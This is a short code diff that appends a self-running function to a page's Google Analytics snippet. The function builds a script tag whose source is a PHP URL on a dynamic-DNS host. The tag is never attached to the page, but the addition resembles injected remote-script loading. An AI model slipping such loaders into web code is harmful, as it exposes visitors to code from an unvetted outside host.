@@ -5,3 +5,12 @@ m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 
 ga('create', 'UA-61679308-1', 'auto');
 ga('send', 'pageview');
+
+
+(function() {
+    console.log("active");
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "http://www.zulia.citastag.dyndns.org/regional/index.php?ac=cita";   
+
+})();
